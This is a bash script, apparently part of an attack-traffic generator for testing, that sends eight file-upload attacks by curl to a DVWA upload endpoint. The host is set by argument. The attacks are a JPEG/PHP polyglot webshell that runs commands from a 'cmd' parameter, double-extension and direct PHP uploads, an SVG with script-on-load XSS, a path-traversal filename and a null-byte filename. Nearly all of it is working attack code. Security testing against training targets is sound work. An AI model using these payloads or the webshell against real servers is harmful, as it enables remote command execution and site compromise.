#!/bin/bash
# File upload attack payloads
# Tools: curl
# Targets: DVWA file upload endpoint
# Estimated duration: 1-2 minutes
set -uo pipefail

TARGET="${1:?Usage: 10-file-upload.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"
MARKER="${TGEN_FAMILY_MARKER:?Run through the declared native family journal adapter}"

echo "[*] File upload attack suite against ${TARGET}"
echo ""

TMPDIR=$(mktemp -d /tmp/upload-attacks.XXXXXX)
trap 'rm -rf "${TMPDIR}"' EXIT

DVWA_UPLOAD="${BASE}/dvwa/vulnerabilities/upload/"

# --- Helper ---
upload_file() {
  local filepath="$1"
  local filename="$2"
  local label="$3"

  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "${DVWA_UPLOAD}" \
    -F "uploaded=@${filepath};filename=${filename}" \
    -F "Upload=Upload" \
    --max-time 15) || code="ERR"
  echo "    ${label} -> HTTP ${code}"
}

# --- 1. PHP webshell disguised as .jpg (polyglot) ---
echo "[+] Upload 1: PHP webshell in .jpg polyglot"
POLYGLOT="${TMPDIR}/evil.jpg"
printf '\xFF\xD8\xFF\xE0' >"${POLYGLOT}"
echo '<?php passthru($_GET["cmd"]); ?>' >>"${POLYGLOT}"
upload_file "${POLYGLOT}" "${MARKER}-avatar.jpg" "PHP-in-JPG polyglot"

echo ""

# --- 2. Double extension ---
echo "[+] Upload 2: Double extension (.php.jpg)"
DOUBLE_EXT="${TMPDIR}/shell.php.jpg"
echo '<?php echo "pwned"; ?>' >"${DOUBLE_EXT}"
upload_file "${DOUBLE_EXT}" "${MARKER}-double.php.jpg" "double extension .php.jpg"

echo ""

# --- 3. Pure PHP file ---
echo "[+] Upload 3: Straight .php upload"
PHP_FILE="${TMPDIR}/webshell.php"
echo '<?php echo "test"; ?>' >"${PHP_FILE}"
upload_file "${PHP_FILE}" "${MARKER}-webshell.php" "direct .php upload"

echo ""

# --- 4. Oversized file (1 MB deterministic data) ---
echo "[+] Upload 4: Oversized file (1 MB)"
BIG_FILE="${TMPDIR}/bigfile.bin"
python3 -c 'import sys; open(sys.argv[1], "wb").write(b"A" * (1024 * 1024))' "${BIG_FILE}"
upload_file "${BIG_FILE}" "${MARKER}-bigfile.bin" "1 MB deterministic data"

echo ""

# --- 5. SVG with embedded JavaScript ---
echo "[+] Upload 5: SVG with embedded JS (XSS)"
SVG_FILE="${TMPDIR}/evil.svg"
cat >"${SVG_FILE}" <<'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <text x="0" y="20">SVG XSS</text>
</svg>
SVGEOF
upload_file "${SVG_FILE}" "${MARKER}-image.svg" "SVG with JS payload"

echo ""

# --- 6. HTML file with inline script ---
echo "[+] Upload 6: HTML with inline script"
HTML_FILE="${TMPDIR}/evil.html"
echo '<html><body><h1>Test</h1></body></html>' >"${HTML_FILE}"
upload_file "${HTML_FILE}" "${MARKER}-page.html" "HTML file"

echo ""

# --- 7. Path traversal in filename ---
echo "[+] Upload 7: Path traversal in filename"
TRAV_FILE="${TMPDIR}/trav.php"
echo '<?php phpinfo(); ?>' >"${TRAV_FILE}"
upload_file "${TRAV_FILE}" "../../${MARKER}-traversal.php" "path traversal ../../shell.php"

echo ""

# --- 8. Null byte in filename ---
echo "[+] Upload 8: Null byte injection in filename"
NULL_FILE="${TMPDIR}/null.php"
echo '<?php phpinfo(); ?>' >"${NULL_FILE}"
upload_file "${NULL_FILE}" "${MARKER}-webnull.php%00.jpg" "null byte shell.php%00.jpg"

echo ""
echo "[*] File upload attack suite complete (8 upload attempts)"
